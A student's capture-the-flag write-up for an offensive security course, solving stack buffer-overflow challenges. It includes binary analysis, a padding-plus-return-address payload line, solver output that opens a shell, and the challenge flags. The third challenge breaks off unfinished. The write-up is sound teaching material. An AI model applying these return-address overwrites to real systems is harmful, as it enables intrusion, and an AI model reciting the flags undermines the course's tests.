# CSGY 9223 Intro to Offensive Security
# Week 5 Challenges
# nam10102

## Challenge - BOF
```aiignore
What happens if we stuff more data into a buffer than what it is meant to hold?

nc offsec-chalbroker.osiris.cyber.nyu.edu 1280
```
Let's examine the file:
```aiignore
$ file bof
bof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=588038367a1cfb78bf6e38c173886158e881c53c, for GNU/Linux 3.2.0, not stripped
```
Not stripped...Good
No PIE...Good

Symbols:
```aiignore
$ readelf -Ws bof

Symbol table '.dynsym' contains 10 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.34 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (3)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.2.5 (3)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (3)
     5: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.2.5 (3)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@GLIBC_2.2.5 (3)
     8: 0000000000404050     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (3)
     9: 0000000000404060     8 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.2.5 (3)

Symbol table '.symtab' contains 42 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crt1.o
     2: 000000000040038c    32 OBJECT  LOCAL  DEFAULT    4 __abi_tag
     3: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
     4: 0000000000401110     0 FUNC    LOCAL  DEFAULT   15 deregister_tm_clones
     5: 0000000000401140     0 FUNC    LOCAL  DEFAULT   15 register_tm_clones
     6: 0000000000401180     0 FUNC    LOCAL  DEFAULT   15 __do_global_dtors_aux
     7: 0000000000404068     1 OBJECT  LOCAL  DEFAULT   26 completed.0
     8: 0000000000403e18     0 OBJECT  LOCAL  DEFAULT   21 __do_global_dtors_aux_fini_array_entry
     9: 00000000004011b0     0 FUNC    LOCAL  DEFAULT   15 frame_dummy
    10: 0000000000403e10     0 OBJECT  LOCAL  DEFAULT   20 __frame_dummy_init_array_entry
    11: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS bof.c
    12: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    13: 0000000000402170     0 OBJECT  LOCAL  DEFAULT   19 __FRAME_END__
    14: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS
    15: 0000000000403e20     0 OBJECT  LOCAL  DEFAULT   22 _DYNAMIC
    16: 0000000000402048     0 NOTYPE  LOCAL  DEFAULT   18 __GNU_EH_FRAME_HDR
    17: 0000000000404000     0 OBJECT  LOCAL  DEFAULT   24 _GLOBAL_OFFSET_TABLE_
    18: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.34
    19: 0000000000404050     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5
    20: 0000000000404040     0 NOTYPE  WEAK   DEFAULT   25 data_start
    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5
    22: 0000000000404060     8 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.2.5
    23: 0000000000404050     0 NOTYPE  GLOBAL DEFAULT   25 _edata
    24: 0000000000401280     0 FUNC    GLOBAL HIDDEN    16 _fini
    25: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.2.5
    26: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5
    27: 0000000000404040     0 NOTYPE  GLOBAL DEFAULT   25 __data_start
    28: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    29: 0000000000404048     0 OBJECT  GLOBAL HIDDEN    25 __dso_handle
    30: 0000000000402000     4 OBJECT  GLOBAL DEFAULT   17 _IO_stdin_used
    31: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.2.5
    32: 0000000000404070     0 NOTYPE  GLOBAL DEFAULT   26 _end
    33: 0000000000401100     5 FUNC    GLOBAL HIDDEN    15 _dl_relocate_static_pie
    34: 00000000004010d0    38 FUNC    GLOBAL DEFAULT   15 _start
    35: 0000000000404050     0 NOTYPE  GLOBAL DEFAULT   26 __bss_start
    36: 00000000004011b6    98 FUNC    GLOBAL DEFAULT   15 main
    37: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setvbuf@GLIBC_2.2.5
    38: 0000000000404050     0 OBJECT  GLOBAL HIDDEN    25 __TMC_END__
    39: 0000000000401218    31 FUNC    GLOBAL DEFAULT   15 get_shell
    40: 0000000000401000     0 FUNC    GLOBAL HIDDEN    12 _init
    41: 0000000000401237    71 FUNC    GLOBAL DEFAULT   15 set_buffering
```

Let's check the security settings:
```aiignore
$ pwn checksec --file=bof
[*] '/mnt/csgy9223_IntroOffSec/week_5/bof'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

No canary...even better.

Let's crack it open in binja:

For main:
```aiignore
  int32_t main(int32_t argc, char** argv, char** envp)

  {
      int32_t argc_1 = argc;
      char** argv_1 = argv;
      set_buffering();
      puts("\n\tHey there! Enjoying OffSec s…");
      printf("\n\t> ");
      void buf;
      gets(&buf);
      printf("\n\t%s\n\n", 0x402032);
      return 0;
  }

```

We see that the gets() is being used and the contents are being stored in buf. 

There is also a function get_shell():
```aiignore
  int64_t get_shell()

  {
      int64_t rbp;
      int64_t var_8 = rbp;
      return system("/bin/sh");
  }

```

Look like the perfect storm for us to override the return address in the stack with the address of get_shell() (0x0000000000401218). There are 28 bytes between this address and the top of the stack.

My guess is to send over the address of the get_shell() function. We'll need a solver script for this. I'll use ELF to dynamically get the address of get_shell() and send the response with 0x28 bytes of garbage then the address of get_shell().
```
$ python bof_solver.py
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1280: Done
0x401218
/mnt/csgy9223_IntroOffSec/week_5/bof_solver.py:19: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("> ")
[*] Switching to interactive mode

        💯

$ ls
bof
flag.txt
$ cat flag.txt
flag{Sm4sh1ng_Th3_St4ck_m0stly_f0r_fUn!_05a713a8067d49c6}
```
## Challenge - Bypass
```
I've added a new protection for my stack! I'm pretty sure you can't find it!

nc offsec-chalbroker.osiris.cyber.nyu.edu 1281
```
Lets start looking at bypass:
```aiignore
$ file bypass
bypass: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b623ed4ab30e3e589e674d35eb7a53047f59f649, for GNU/Linux 3.2.0, not stripped
```
```aiignore
$ pwn checksec --file=bypass
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/nmaiorana/.cache/.pwntools-cache-3.12/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.0)
[*] '/mnt/csgy9223_IntroOffSec/week_5/bypass'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Okay. No canary, PIE and not stripped. I wonder what extra security they added? Running process:
```aiignore
$ ./bypass

        What is your favorite season?

        btw, somebody left this number for you: 0xb0719fbe4fb6371d

        >
```
I wonder what address that is for? Binja time.
That's not an address. It's a random number. Creating a solver to send the value and see what happens. 

Also, there is a function called win, but it never gets called. Looks like that number is a decoy. It does not even check it against anything. It essentially compares it to itself and returns. 

I'm going to try to exploit the input by overriding the rip with the address of win(). It looks like I have to send the number in, so that it's comparison returns. If I can properly set the rip, this will work.

The text of the number printed is in hex. Looking into printf() to see what the default representation is if there are nor formatting directives.

Looks like we have to overwrite 2 things. First the number (long) and then the return address.

```aiignore
p.sendline((b'B' * 0x18) + p64(number) + (b'B' * 0x8) + p64(target_addr))
```
- 24 bytes to get to the location of number
- packed 64 bit value of number
- 8 bytes to get to the location of the rip
- Address of the win() function
This works, but crashes the process due to skipping the call instruction to win(). I tried using pwn to assemble the preamble:
```aiignore
00401383  f30f1efa           endbr64 
00401387  55                 push    rbp {__saved_rbp}
```
By computing the size of those two instructions:
```aiignore
a = asm("endbr64; push rbp")
```
Unfortunately, this crashes my solver script. So to get past this for now, I subtracted the relative address from the next instruction from the beginning of the win function to determine where I want to jump into the win() function:

```aiignore
>>> 0x00401388 - 0x00401383
5
```
Once I added thse 5 bytes to the address of win(), I got my flag.
```aiignore
$ python bypass_solver.py
[+] Opening connection to offsec-chalbroker.osiris.cyber.nyu.edu on port 1281: Done
Target address: 0x401383
Number: 17355010529405525756
[*] Switching to interactive mode

You made it!

$ ls
bypass
flag.txt
$ cat flag.txt
flag{n0_n33d_t0_gu3ss_wh3n_y0u_c4n_L34K_0f_th3_CaNarY_v4lu3!_966cfb138098902a}
```
## Challenge - Trivia
```aiignore
It's Trivia Time!!

nc offsec-chalbroker.osiris.cyber.nyu.edu 1284
```
I download the binary and start looking around:
```aiignore
$ pwn checksec --file=trivia
[*] '/mnt/csgy9223_IntroOffSec/week_5/trivia'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
No pie, No carary. Running the binary:
```aiignore
$ ./trivia


        It's Trivia Time!

        What is your favorite color?
        >
```
Open binja:

The main() function calls read(), so no gets() being called. But the number of bytes to be read in are 0x12, 18 bytes. So this can still be exploited since the address of buf is 18 bytes in. But there is a twist, if the win() function is called, it runs the value in &data. This is read in as the result of the 2nd question, so what if I put in "/bin/sh"? I'll set up a solver to try it out.

Looking at win(), we want to be 5 bytes in. 

I also have to xor the value to: "0xdec5cdc0b0c4dcc0". This is given to us in the init function: -0x2152411021524111. This is stored in an unsigned 64 bit int and ends up being:
'0xdeadbeefdeadbeef'.
